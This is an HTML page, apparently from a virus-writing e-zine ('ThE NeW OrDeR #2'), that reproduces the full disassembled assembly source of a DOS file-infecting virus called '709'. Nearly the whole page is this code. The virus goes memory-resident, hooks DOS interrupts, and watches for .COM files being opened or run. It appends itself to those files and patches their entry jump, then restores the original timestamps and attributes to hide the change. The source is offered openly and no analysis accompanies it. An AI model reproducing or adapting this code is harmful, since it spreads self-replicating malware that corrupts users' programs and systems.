<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>ThE NeW OrDeR #2</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#000080"
bgproperties="fixed" topmargin="15" leftmargin="20" "
vlink="#000080">

<p align="center"><img src="../Images/viruz.gif" width="560"
height="100"></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../images/Rs.jpg" width="640" height="12"></strong></font></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../Images/fogskul.gif" alt="OneHalf  Virii" width="160"
height="100"></strong></font></p>

<p align="center"><font color="#FF0000" size="6"><strong>709</strong></font></p>

<p align="left"><font color="#00FFFF"><strong>;
--------------------------------------------------------------------------<br>
; Disassembled by FairWind / NRG , nrgteam@mail.ru<br>
;
--------------------------------------------------------------------------</strong></font></p>

<p align="left"><font color="#FFFFFF"><strong>data_1e equ 0<br>
data_2e equ 2<br>
data_3e equ 2Ch<br>
data_4e equ 2Eh<br>
data_5e equ 30h<br>
data_6e equ 32h<br>
data_7e equ 54h<br>
data_8e equ 56h<br>
data_9e equ 70h<br>
data_10e equ 72h<br>
data_11e equ 84h<br>
data_12e equ 86h<br>
data_16e equ 0<br>
data_17e equ 3<br>
data_18e equ 12h<br>
data_19e equ 0C0h<br>
data_20e equ 0C2h<br>
data_30e equ 0C0h<br>
data_31e equ 0C2h<br>
data_32e equ 0C9h<br>
data_33e equ 0CBh<br>
<br>
seg_a segment byte public<br>
assume cs:seg_a, ds:seg_a<br>
org 100h<br>
<br>
_709 proc far<br>
start: lock mov ax,offset loc_6<br>
jmp ax<br>
<br>
db 20 dup (5Ah)<br>
db 0B9h, 00h, 10h<br>
locloop_5: loop locloop_5<br>
retn<br>
loc_6: call sub_1<br>
_709 endp<br>
sub_1 proc near<br>
pop ax<br>
sub ax,3<br>
cli<br>
push ds<br>
push ax<br>
push es<br>
mov dx,30h<br>
mov es,dx<br>
mov dx,es:data_16e<br>
cmp dx,8086h<br>
je loc_7<br>
mov word ptr es:data_16e,8086h<br>
call sub_2<br>
loc_7: pop es<br>
pop ax<br>
pop ds<br>
mov cx,6<br>
mov di,100h<br>
mov si,251h<br>
add si,ax<br>
rep movsb<br>
sti<br>
mov ax,offset start<br>
jmp ax<br>
sub_2: mov dx,ax<br>
mov ax,cs<br>
dec ax<br>
mov es,ax<br>
mov ax,es:data_17e<br>
sub ax,0A0h<br>
mov es:data_17e,ax<br>
mov ax,es:data_18e<br>
sub ax,0A0h<br>
mov es:data_18e,ax<br>
mov es,ax<br>
mov ax,cs<br>
mov ds,ax<br>
mov cx,500h<br>
mov si,dx<br>
xor di,di<br>
rep movsw<br>
push es<br>
mov si,es<br>
xor ax,ax<br>
mov es,ax<br>
mov ax,es:data_11e<br>
mov cx,es:data_12e<br>
pop es<br>
mov es:data_30e,ax<br>
mov es:data_31e,cx<br>
push es<br>
xor ax,ax<br>
mov es,ax<br>
pop ax<br>
mov bx,0BBh<br>
mov es:data_11e,bx<br>
mov es:data_12e,ax<br>
xor ax,ax<br>
mov es,ax<br>
mov bx,es:data_9e<br>
mov cx,es:data_10e<br>
mov ax,si<br>
mov word ptr es:data_9e,0C4h<br>
mov es:data_10e,ax<br>
mov es,ax<br>
mov es:data_32e,bx<br>
mov es:data_33e,cx<br>
retn<br>
sub_1 endp<br>
<br>
nop<br>
call sub_4<br>
db 0EAh, 67h, 01h, 1Ch, 1Bh<br>
nop<br>
call sub_3<br>
db 0EAh, 1Eh, 01h, 0Bh, 1Ch<br>
sub_3 proc near<br>
push ds<br>
push es<br>
push ax<br>
push bx<br>
push cx<br>
push dx<br>
push di<br>
push si<br>
call sub_5<br>
pop si<br>
pop di<br>
pop dx<br>
pop cx<br>
pop bx<br>
pop ax<br>
pop es<br>
pop ds<br>
retn<br>
sub_3 endp<br>
db 0, 0<br>
sub_4 proc near<br>
push ds<br>
push es<br>
push ax<br>
push bx<br>
push cx<br>
push dx<br>
push di<br>
push si<br>
pushf<br>
cmp ax,3D00h<br>
je loc_8<br>
cmp ah,4Bh<br>
je loc_8<br>
jmp loc_18<br>
loc_8: mov bx,dx<br>
loc_9: mov al,[bx]<br>
inc bx<br>
cmp al,2Eh<br>
jne loc_9<br>
cmp byte ptr [bx],43h<br>
jne loc_10<br>
cmp byte ptr [bx+1],4Fh<br>
jne loc_10<br>
cmp byte ptr [bx+2],4Dh<br>
jne loc_10<br>
jmp short loc_11<br>
nop<br>
loc_10: jmp loc_17<br>
loc_11: mov ah,0FFh<br>
mov bx,dx<br>
cmp byte ptr [bx+1],3Ah<br>
jne loc_12<br>
mov ah,[bx]<br>
or ah,20h<br>
sub ah,61h<br>
loc_12: call sub_6<br>
or si,si<br>
jz loc_13<br>
jmp loc_18<br>
loc_13: push ax<br>
xor ax,ax<br>
mov es,ax<br>
mov ax,es:data_1e<br>
mov bx,es:data_2e<br>
mov word ptr cs:[243h],ax<br>
mov word ptr cs:[245h],bx<br>
pop ax<br>
push ds<br>
push es<br>
push cs<br>
pop ds<br>
xor ax,ax<br>
mov es,ax<br>
mov ax,cs:data_19e<br>
mov bx,cs:data_20e<br>
mov es:data_1e,ax<br>
mov es:data_2e,bx<br>
pop es<br>
pop ds<br>
mov ax,ds<br>
mov word ptr cs:[23Fh],ax<br>
mov ax,4300h<br>
mov si,dx<br>
int 0<br>
mov di,cx<br>
mov dx,si<br>
and cx,0FFFEh<br>
mov ax,4301h<br>
int 0 ; Divide by 0<br>
mov ax,3D02h<br>
int 0<br>
push cs<br>
pop ds<br>
mov bx,ax<br>
mov ax,5700h<br>
push bx<br>
int 0<br>
pop bx<br>
mov word ptr ds:[241h],cx<br>
mov word ptr ds:[243h],dx<br>
push bx<br>
mov ah,3Fh<br>
mov cx,6<br>
mov dx,251h<br>
int 0<br>
pop bx<br>
push bx<br>
cmp byte ptr cs:[251h],0F0h<br>
je loc_14<br>
cmp ax,6<br>
jl loc_14<br>
jmp short loc_15<br>
nop<br>
loc_14: jmp short loc_16<br>
db 90h<br>
loc_15: pop bx<br>
push bx<br>
mov ax,4202h<br>
xor cx,cx<br>
xor dx,dx<br>
int 0<br>
add ax,100h<br>
mov word ptr cs:[249h],ax<br>
add ax,2C5h<br>
jc loc_14<br>
push cs<br>
pop es<br>
push cs<br>
pop ds<br>
mov ah,40h<br>
pop bx<br>
push bx<br>
mov cx,2C5h<br>
push cx<br>
xor dx,dx<br>
int 0<br>
pop cx<br>
cmp ax,cx<br>
jne loc_14<br>
pop bx<br>
push bx<br>
mov ax,4200h<br>
xor cx,cx<br>
xor dx,dx<br>
int 0<br>
mov ah,40h <br>
pop bx<br>
push bx<br>
mov cx,6<br>
mov dx,247h<br>
int 0<br>
loc_16: mov ax,5701h<br>
mov cx,word ptr cs:[241h]<br>
mov dx,word ptr cs:[243h]<br>
int 0<br>
pop bx<br>
mov ah,3Eh<br>
int 0<br>
mov ax,4301h<br>
mov dx,si<br>
mov bx,word ptr cs:[23Fh]<br>
mov ds,bx<br>
mov cx,di<br>
int 0<br>
loc_17: xor ax,ax<br>
mov ds,ax<br>
mov ax,word ptr cs:[243h]<br>
mov bx,word ptr cs:[245h]<br>
mov ds:data_1e,ax<br>
mov ds:data_2e,bx<br>
loc_18:<br>
popf<br>
pop si<br>
pop di<br>
pop dx<br>
pop cx<br>
pop bx<br>
pop ax<br>
pop es<br>
pop ds<br>
retn<br>
sub_4 endp<br>
db 49h, 98h,0C1h, 68h, 65h, 18h<br>
db 8Ah, 0Ch,0F0h,0B8h, 20h, 01h<br>
db 0FFh,0E0h, 00h, 00h,0FFh,0E0h<br>
db 0EBh, 18h, 90h, 5Ah, 5Ah, 5Ah<br>
db 0CDh, 20h, 00h, 00h, 00h, 00h<br>
db 0CDh, 20h, 00h, 00h, 00h, 00h<br>
sub_5 proc near<br>
xor ax,ax<br>
mov es,ax<br>
mov ax,es:data_7e<br>
mov bx,es:data_8e<br>
mov es:data_3e,ax<br>
mov es:data_5e,ax<br>
mov es:data_4e,bx<br>
mov es:data_6e,bx<br>
retn<br>
sub_5 endp<br>
</strong></font><font color="#FFFFFF"><strong>sub_6 proc near<br>
xor si,si<br>
push ax<br>
push dx<br>
push es<br>
push cs<br>
pop es<br>
mov al,ah<br>
cmp ah,0FFh<br>
jne loc_20<br>
mov ah,19h<br>
int 21h<br>
loc_20: cmp al,1<br>
jg loc_22<br>
mov dl,al<br>
xor dh,dh<br>
mov ax,201h<br>
mov bx,2C5h<br>
inc bx<br>
mov cx,101h<br>
push bx<br>
push cx<br>
push dx<br>
int 13h<br>
pop dx<br>
pop cx<br>
pop bx<br>
or ah,ah<br>
jz loc_21<br>
inc si<br>
jmp short loc_22<br>
db 90h<br>
loc_21: mov ax,301h<br>
int 13h<br>
or ah,ah<br>
jz loc_22<br>
inc si<br>
loc_22: pop es<br>
pop dx<br>
pop ax<br>
retn<br>
sub_6 endp<br>
<br>
seg_a ends<br>
end start</strong></font></p>

<p align="center"><a href="../TNO#2_start.htm"><img
src="../images/14ic3.gif" border="0" width="60" height="65"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../images/coollogo_com_7565375.jpg" border="0" width="206"
height="53"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../Images/coollogo_com_21259199.jpg" border="0" width="518"
height="56"></a></p>
</body>
</html>
